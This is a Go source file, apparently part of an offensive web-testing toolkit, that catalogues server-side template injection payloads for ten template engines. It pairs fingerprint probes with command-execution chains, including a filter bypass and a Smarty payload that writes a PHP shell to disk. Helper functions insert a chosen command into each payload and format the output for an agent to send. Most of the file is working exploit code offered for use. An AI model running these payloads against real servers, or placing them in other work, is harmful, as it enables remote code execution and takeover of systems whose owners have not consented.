package webgo

import (
	"fmt"
	"strings"
)

// SSTI — Server-Side Template Injection. Catalogue of engine-specific
// payloads that escalate from template reflection to code execution.
//
// Recognition probe: send `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}` to
// every reflected input. If any returns 49, that engine is on the box.
//
// Then dispatch: each engine has a chain to RCE. The chains here are the
// well-published ones — Jinja2's MRO walk, Twig's filter chain, Freemarker's
// Execute class, Velocity's Runtime.exec, and so on. The Go code emits them
// as payload strings; the caller decides where to send them.

// SSTIEngine identifies a template engine.
type SSTIEngine string

const (
	EngineJinja2     SSTIEngine = "jinja2"
	EngineTwig       SSTIEngine = "twig"
	EngineFreemarker SSTIEngine = "freemarker"
	EngineVelocity   SSTIEngine = "velocity"
	EngineSmarty     SSTIEngine = "smarty"
	EngineMako       SSTIEngine = "mako"
	EnginePebble     SSTIEngine = "pebble"
	EngineHandlebars SSTIEngine = "handlebars"
	EngineERB        SSTIEngine = "erb"
	EngineTornado    SSTIEngine = "tornado"
)

// SSTIFingerprint is the probe that identifies the engine.
type SSTIFingerprint struct {
	Payload  string
	Expected string
	Engine   SSTIEngine
	Language string
}

// Fingerprints is the fingerprint probe list.
var Fingerprints = []SSTIFingerprint{
	{Payload: "{{7*7}}", Expected: "49", Engine: EngineJinja2, Language: "Python (Jinja2/Twig/Nunjucks)"},
	{Payload: "${7*7}", Expected: "49", Engine: EngineFreemarker, Language: "Java/FreeMarker, JSP EL"},
	{Payload: "<%= 7*7 %>", Expected: "49", Engine: EngineERB, Language: "Ruby ERB / JSP"},
	{Payload: "#{7*7}", Expected: "49", Engine: EngineVelocity, Language: "Ruby string interp / Velocity"},
	{Payload: "{{7*'7'}}", Expected: "7777777", Engine: EngineJinja2, Language: "Jinja2 only (Python string repeat)"},
	{Payload: "{{7*'7'}}", Expected: "49", Engine: EngineTwig, Language: "Twig only (PHP casts)"},
	{Payload: "${7*7}", Expected: "49", Engine: EngineFreemarker, Language: "Java"},
	{Payload: "{$smarty.version}", Expected: "Smarty", Engine: EngineSmarty, Language: "PHP Smarty"},
	{Payload: "${T(java.lang.Runtime).getRuntime().exec('id')}", Expected: "", Engine: EngineVelocity, Language: "Spring EL (spel)"},
}

// SSTIPayload is one exploitation chain for an engine.
type SSTIPayload struct {
	Engine  SSTIEngine
	Label   string
	Payload string // may contain {CMD} placeholder
	Notes   string
}

// SSTIPayloads is the exploitation catalogue.
var SSTIPayloads = []SSTIPayload{
	// Jinja2 — Python, chain via MRO to reach os.popen
	{Engine: EngineJinja2, Label: "os.popen (direct)", Payload: "{{ ''.__class__.__mro__[1].__subclasses__()[<IDX>]('{CMD}',shell=True,stdout=-1).communicate()[0] }}", Notes: "Find the subprocess.Popen index with __subclasses__[].__name__ scan"},
	{Engine: EngineJinja2, Label: "config import", Payload: "{{ config.__class__.__init__.__globals__['os'].popen('{CMD}').read() }}", Notes: "Often works when config is in scope"},
	{Engine: EngineJinja2, Label: "lipsum globals", Payload: "{{ lipsum.__globals__['os'].popen('{CMD}').read() }}", Notes: "lipsum is a default Jinja2 global"},
	{Engine: EngineJinja2, Label: "cycler globals", Payload: "{{ cycler.__init__.__globals__.os.popen('{CMD}').read() }}", Notes: "Another default global"},
	{Engine: EngineJinja2, Label: "joiner globals", Payload: "{{ joiner.__init__.__globals__.os.popen('{CMD}').read() }}", Notes: "Same family"},
	{Engine: EngineJinja2, Label: "namespace globals", Payload: "{{ namespace.__init__.__globals__.os.popen('{CMD}').read() }}", Notes: "Same family"},
	{Engine: EngineJinja2, Label: "attr bypass (filter_dot)", Payload: "{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}", Notes: "Defeats naive '__' filters"},
	{Engine: EngineJinja2, Label: "request globals", Payload: "{{ request.application.__globals__.__builtins__.__import__('os').popen('{CMD}').read() }}", Notes: "Flask-specific"},

	// Twig — PHP
	{Engine: EngineTwig, Label: "filter chain (Twig 1.x)", Payload: "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('{CMD}') }}", Notes: "Old Twig <1.20"},
	{Engine: EngineTwig, Label: "filter chain (Twig 2/3)", Payload: "{{ ['{CMD}']|filter('system') }}", Notes: "Needs 'filter' enabled"},
	{Engine: EngineTwig, Label: "map+filter RCE", Payload: "{{ ['{CMD}']|map('system')|join }}", Notes: "Common bypass"},
	{Engine: EngineTwig, Label: "sort callback", Payload: "{{ ['{CMD}']|sort('system') }}", Notes: "Another filter"},

	// Freemarker — Java
	{Engine: EngineFreemarker, Label: "Execute (direct)", Payload: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('{CMD}')}", Notes: "Classic FreeMarker RCE"},
	{Engine: EngineFreemarker, Label: "ObjectConstructor", Payload: "${'freemarker.template.utility.Execute'?new()('{CMD}')}", Notes: "Shorthand"},

	// Velocity — Java
	{Engine: EngineVelocity, Label: "Runtime.exec", Payload: "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())#set($p=$rt.exec('{CMD}'))#set($br=$p.getInputStream())", Notes: "Velocity templates allow arbitrary reflection"},
	{Engine: EngineVelocity, Label: "ProcessBuilder", Payload: "$class.inspect('java.lang.Runtime').type.getRuntime().exec('{CMD}')", Notes: "Alternate form"},

	// Smarty — PHP
	{Engine: EngineSmarty, Label: "php function call", Payload: "{php}echo `{CMD}`;{/php}", Notes: "Needs {php} tags enabled (Smarty 2)"},
	{Engine: EngineSmarty, Label: "Smarty 3 static method", Payload: "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system('{CMD}'); ?>\",self::clearConfig())}", Notes: "Writes a shell to disk"},

	// Mako — Python
	{Engine: EngineMako, Label: "python import", Payload: "${__import__('os').popen('{CMD}').read()}", Notes: "Direct python expression"},

	// Pebble — Java
	{Engine: EnginePebble, Label: "Runtime exec", Payload: "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}", Notes: "Reflection chain"},

	// ERB — Ruby
	{Engine: EngineERB, Label: "backtick", Payload: "<%= `{CMD}` %>", Notes: "Ruby backtick literal"},

	// Tornado — Python
	{Engine: EngineTornado, Label: "import exec", Payload: "{% import os %}{{ os.popen('{CMD}').read() }}", Notes: "Tornado templates allow imports"},
	{Engine: EngineTornado, Label: "raw exec", Payload: "{% import subprocess %}{{ subprocess.check_output('{CMD}', shell=True) }}", Notes: "Alternate"},
}

// RenderSSTIPayload substitutes {CMD} in one payload.
func RenderSSTIPayload(p SSTIPayload, cmd string) string {
	return strings.ReplaceAll(p.Payload, "{CMD}", cmd)
}

// ListSSTIForEngine returns all payloads for a specific engine.
func ListSSTIForEngine(e SSTIEngine) []SSTIPayload {
	var out []SSTIPayload
	for _, p := range SSTIPayloads {
		if p.Engine == e {
			out = append(out, p)
		}
	}
	return out
}

// ListSSTIFingerprints returns the fingerprint probes.
func ListSSTIFingerprints() []SSTIFingerprint {
	return Fingerprints
}

// SuggestSSTIEngine guesses an engine from a fingerprint response. Very
// rough — the operator is expected to know their target.
func SuggestSSTIEngine(payload, response string) []SSTIEngine {
	var out []SSTIEngine
	if strings.Contains(payload, "{{7*7}}") && strings.Contains(response, "49") {
		out = append(out, EngineJinja2, EngineTwig)
	}
	if strings.Contains(payload, "${7*7}") && strings.Contains(response, "49") {
		out = append(out, EngineFreemarker, EngineVelocity)
	}
	if strings.Contains(payload, "<%=") && strings.Contains(response, "49") {
		out = append(out, EngineERB)
	}
	return out
}

// FormatSSTIReport returns a short summary list for the agent to ship.
func FormatSSTIReport(engine SSTIEngine, cmd string) string {
	var b strings.Builder
	fmt.Fprintf(&b, "engine=%s cmd=%q\n", engine, cmd)
	for _, p := range ListSSTIForEngine(engine) {
		fmt.Fprintf(&b, "[%s] %s\n  %s\n", p.Label, p.Notes, RenderSSTIPayload(p, cmd))
	}
	return b.String()
}
